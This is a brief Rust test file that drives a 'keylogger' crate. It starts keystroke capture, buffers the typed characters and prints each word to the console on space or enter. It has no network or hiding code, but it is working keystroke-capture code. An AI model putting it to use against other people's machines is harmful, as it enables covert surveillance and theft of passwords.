use std::io::Write;

use keylogger::KeyLogger;
use spin::Mutex;

#[test]
fn main() {
    let mut kl = KeyLogger::init().unwrap();
    let buffer: Mutex<Vec<char>> = Mutex::new(Vec::new());
    let test = kl.start_logging(move |c| {
        let mut lock = buffer.lock();
        let code = c as u32;
        if code == 32 || code == 13 {
            for c in lock.drain(0..) {
                print!("{}", c);
            }
            if code == 32 {
                print!(" ");
                let _ = std::io::stdout().flush();
            } else {
                println!();
                let _ = std::io::stdout().flush();
            }
        } else if c != '\0' {
            lock.push(c)
        }
        drop(lock);
    });
    if let Err(e) = test {
        println!("{}", e);
    }
}
